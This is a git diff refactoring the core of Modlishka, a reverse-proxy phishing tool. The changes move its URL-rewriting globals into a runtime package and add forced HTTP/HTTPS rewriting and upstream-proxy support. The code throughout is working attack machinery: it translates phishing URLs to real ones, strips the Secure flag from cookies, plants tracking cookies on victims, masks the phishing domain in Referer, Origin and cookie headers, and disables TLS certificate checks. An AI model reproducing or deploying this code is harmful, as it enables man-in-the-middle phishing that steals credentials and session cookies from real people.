@@ -23,6 +23,7 @@ import (
 	"github.com/drk1wi/Modlishka/config"
 	"github.com/drk1wi/Modlishka/log"
 	"github.com/drk1wi/Modlishka/plugin"
+	"github.com/drk1wi/Modlishka/runtime"
 	"io"
 	"io/ioutil"
 	"net"
@@ -47,15 +48,15 @@ type ReverseProxy struct {
 	Terminate      bool                   // indicates whether this client should be released/terminated
 	Proxy          *httputil.ReverseProxy // instance of Go ReverseProxy that will proxy requests/responses
 	Config         *config.Options
-
 	IsTLS bool
 }
 
-type Settings struct {
+type ReverseProxyFactorySettings struct {
 	config.Options
 	target         string
 	originaltarget string
 	origin         string
+	IsTLS 		   bool
 }
 
 type HTTPResponse struct {
@@ -72,7 +73,7 @@ func (p *ReverseProxy) rewriteResponse(r *http.Response) (err error) {
 	response := HTTPResponse{r}
 	response.PatchHeaders(p)
 
-	if !IsValidMediaType(response.Header.Get("Content-Type")) {
+	if !runtime.IsValidMediaType(response.Header.Get("Content-Type")) {
 		return
 	}
 
@@ -124,6 +125,7 @@ func (p *ReverseProxy) rewriteRequest(r *http.Request) (err error) {
 		Origin:         p.Origin,
 		PhishUser:      p.PhishUser,
 		OriginalTarget: p.OriginalTarget,
+		IsTLS: p.IsTLS,
 	}
 	ctx.InvokeHTTPRequestHooks(request.Request)
 
@@ -137,7 +139,7 @@ func (p *ReverseProxy) rewriteRequest(r *http.Request) (err error) {
 			return err
 		}
 
-		buffer = []byte(RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(string(buffer), PhishURLToRealURL))
+		buffer = []byte(runtime.RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(string(buffer), runtime.PhishURLToRealURL))
 
 		request.Body = ioutil.NopCloser(bytes.NewReader(buffer))
 		request.ContentLength = int64(len(buffer))
@@ -166,7 +168,7 @@ func (httpRequest *HTTPRequest) PatchHeaders(p *ReverseProxy) {
 	// Patch HTTP Origin:
 	origin := ""
 	if p.Origin != "" {
-		origin = RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(p.Origin, PhishURLToRealURL)
+		origin = runtime.RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(p.Origin, runtime.PhishURLToRealURL)
 
 		if origin != "" {
 			log.Debugf("Patching request Origin [%s] -> [%s]", p.Origin, origin)
@@ -177,7 +179,7 @@ func (httpRequest *HTTPRequest) PatchHeaders(p *ReverseProxy) {
 	// Patch HTTP Referer:
 	// Prevent phish domain leakage via referer
 	if httpRequest.Referer() != "" {
-		newReferer := RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(httpRequest.Referer(), PhishURLToRealURL)
+		newReferer := runtime.RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(httpRequest.Referer(), runtime.PhishURLToRealURL)
 		httpRequest.Header.Set("Referer", newReferer)
 
 		log.Debugf("Patching request Referer [%s] -> [%s]", httpRequest.Referer(), newReferer)
@@ -186,9 +188,9 @@ func (httpRequest *HTTPRequest) PatchHeaders(p *ReverseProxy) {
 	// Patch Cookies:
 	// Prevent phish domain leakage via cookies
 	if httpRequest.Header.Get("Cookie") != "" {
-		cookie := RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(httpRequest.Header.Get("Cookie"), PhishURLToRealURL)
-		if TrackingCookie != "" {
-			cookie = RegexpCookieTracking.ReplaceAllString(cookie, "")
+		cookie := runtime.RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(httpRequest.Header.Get("Cookie"), runtime.PhishURLToRealURL)
+		if runtime.TrackingCookie != "" {
+			cookie = runtime.RegexpCookieTracking.ReplaceAllString(cookie, "")
 		}
 		log.Debugf("Patching request Cookies [%s] -> [%s]", httpRequest.Header.Get("Cookie"), cookie)
 		httpRequest.Header.Set("Cookie", cookie)
@@ -236,7 +238,7 @@ func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 			//strip out the secure Flag
 			r := strings.NewReplacer("Secure", "", "secure", "")
 			cookie := r.Replace(v)
-			cookie = RegexpFindSetCookie.ReplaceAllStringFunc(cookie, TranslateSetCookie)
+			cookie = runtime.RegexpFindSetCookie.ReplaceAllStringFunc(cookie, runtime.TranslateSetCookie)
 			log.Debugf("Rewriting Set-Cookie Flags: from \n[%s]\n --> \n[%s]\n", httpResponse.Header["Set-Cookie"][i], cookie)
 			httpResponse.Header["Set-Cookie"][i] = cookie
 		}
@@ -244,8 +246,8 @@ func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 
 	if p.InitPhishUser != "" {
 		// Add tracking cookie
-		value := TrackingCookie + "=" + p.InitPhishUser +
-			";Path=/;Domain=" + PhishingDomain +
+		value := runtime.TrackingCookie + "=" + p.InitPhishUser +
+			";Path=/;Domain=" + runtime.ProxyDomain +
 			";Expires=Sat, 26-Oct-2025 18:54:56 GMT;Priority=HIGH"
 		httpResponse.Header.Add("Set-Cookie", value)
 	}
@@ -254,8 +256,8 @@ func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 		log.Infof("Terminating session")
 
 		// Set Terminator Cookie
-		value := TERMINATE_SESSION_COOKIE_NAME + "=" + TERMINATE_SESSION_COOKIE_VALUE +
-			";Path=/;Domain=." + PhishingDomain +
+		value := runtime.TERMINATE_SESSION_COOKIE_NAME + "=" + runtime.TERMINATE_SESSION_COOKIE_VALUE +
+			";Path=/;Domain=." + runtime.ProxyDomain +
 			";Expires=Sat, 26-Oct-2025 18:54:56 GMT;HttpOnly;Priority=HIGH"
 		httpResponse.Header.Add("Set-Cookie", value)
 	}
@@ -263,7 +265,7 @@ func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 	// Patch WWW-Authenticate:
 	if len(httpResponse.Header["WWW-Authenticate"]) > 0 {
 		oldAuth := httpResponse.Header.Get("WWW-Authenticate")
-		newAuth := RegexpUrl.ReplaceAllStringFunc(oldAuth, RealURLtoPhish)
+		newAuth := runtime.RegexpUrl.ReplaceAllStringFunc(oldAuth, runtime.RealURLtoPhish)
 
 		log.Debugf("Rewriting WWW-Authenticate: from \n[%s]\n --> \n[%s]\n", oldAuth, newAuth)
 		httpResponse.Header.Set("WWW-Authenticate", newAuth)
@@ -272,18 +274,19 @@ func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 	//handle 302
 	if httpResponse.Header.Get("Location") != "" {
 		oldLocation := httpResponse.Header.Get("Location")
-		newLocation := RegexpUrl.ReplaceAllStringFunc(string(oldLocation), RealURLtoPhish)
+		newLocation := runtime.RegexpUrl.ReplaceAllStringFunc(string(oldLocation), runtime.RealURLtoPhish)
 
-		if len(TargetResources) > 0 {
-			for _, res := range TargetResources {
-				newLocation = strings.Replace(newLocation, res, RealURLtoPhish(res), -1)
-			}
+		if runtime.ForceHTTPS == true {
+			newLocation = strings.Replace(newLocation, "http://", "https://", -1)
+		} else if runtime.ForceHTTP == true {
+			newLocation = strings.Replace(newLocation, "https://", "http://", -1)
 		}
 
-		if p.IsTLS == true {
-			newLocation = strings.Replace(newLocation, "http://", "https://", -1)
-		} else {
-			newLocation = strings.Replace(newLocation, "https://", "http://", -1)
+		if len(runtime.TargetResources) > 0 {
+			for _, res := range runtime.TargetResources {
+				log.Debugf("wtf: %s",res)
+				newLocation = strings.Replace(newLocation, res, runtime.RealURLtoPhish(res), -1)
+			}
 		}
 
 		log.Debugf("Rewriting Location Header [%s] to [%s]", oldLocation, newLocation)
@@ -302,12 +305,12 @@ func (httpRequest *HTTPRequest) PatchQueryString() {
 			//fmt.Println(queryString[key])
 			for i, v := range queryString[key] {
 				qParams = append(qParams, fmt.Sprintf("%s = %s", key, v))
-				queryString[key][i] = RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(v, PhishURLToRealURL)
+				queryString[key][i] = runtime.RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(v, runtime.PhishURLToRealURL)
 			}
 		}
 
 		//Prevent leakage of the tracking parameter
-		delete(queryString, TrackingParam)
+		delete(queryString, runtime.TrackingParam)
 		httpRequest.URL.RawQuery = queryString.Encode()
 	}
 
@@ -424,34 +427,38 @@ func (p *ReverseProxy) InjectPayloads(buffer []byte) []byte {
 
 func (p *ReverseProxy) PatchURL(buffer []byte) []byte {
 
-	// Fix protocol
-	if p.IsTLS == false {
-		buffer = bytes.Replace(buffer, []byte("https"), []byte("http"), -1)
-	}
 
 	// Translate URLs
-	buffer = []byte(RegexpUrl.ReplaceAllStringFunc(string(buffer), RealURLtoPhish))
+	buffer = []byte(runtime.RegexpUrl.ReplaceAllStringFunc(string(buffer), runtime.RealURLtoPhish))
 
-	if len(ReplaceStrings) > 0 {
-		for key, value := range ReplaceStrings {
+	if len(runtime.ReplaceStrings) > 0 {
+		for key, value := range runtime.ReplaceStrings {
 			buffer = bytes.Replace(buffer, []byte(key), []byte(value), -1)
 		}
 	}
 
-	if len(TargetResources) > 0 {
-		for _, res := range TargetResources {
-			buffer = bytes.Replace(buffer, []byte(res), []byte(RealURLtoPhish(res)), -1)
+
+	if runtime.ForceHTTPS == true {
+		buffer = bytes.Replace(buffer, []byte("http://"), []byte("https://"), -1)
+	}
+
+	if runtime.ForceHTTP == true {
+		buffer = bytes.Replace(buffer, []byte("https://"), []byte("http://"), -1)
+	}
+
+	if len(runtime.TargetResources) > 0 {
+		for _, res := range runtime.TargetResources {
+			buffer = bytes.Replace(buffer, []byte(res), []byte(runtime.RealURLtoPhish(res)), -1)
 		}
 	}
+
+
 
 	return buffer
 }
 
-
-
-
 // ReverseProxy factory
-func (s *Settings) NewReverseProxy() *ReverseProxy {
+func (s *ReverseProxyFactorySettings) NewReverseProxy() *ReverseProxy {
 
 	targetURL, _ := url.Parse(s.target)
 
@@ -460,13 +467,13 @@ func (s *Settings) NewReverseProxy() *ReverseProxy {
 		Origin:         s.origin,
 		Proxy:          httputil.NewSingleHostReverseProxy(targetURL),
 		Config:         &s.Options,
-		IsTLS:          *s.UseTls,
+		IsTLS:          s.IsTLS,
 		OriginalTarget: s.originaltarget,
 	}
 
 
-	// Ignoring invalid target certificates
-	rp.Proxy.Transport = &http.Transport{
+
+	transport := &http.Transport{
 
 		TLSClientConfig: &tls.Config{
 			InsecureSkipVerify: true,
@@ -480,9 +487,15 @@ func (s *Settings) NewReverseProxy() *ReverseProxy {
 		ResponseHeaderTimeout: 10 * time.Second,
 		ExpectContinueTimeout: 1 * time.Second,
 		IdleConnTimeout:       5 * time.Second,
-
-
 	}
+
+	if runtime.ProxyAddress != "" {
+		urlProxy, _ := url.Parse(runtime.ProxyAddress)
+		transport.Proxy = http.ProxyURL(urlProxy)
+	}
+
+	// Ignoring invalid target certificates
+	rp.Proxy.Transport = transport
 
 	// Handling: Request
 	director := rp.Proxy.Director
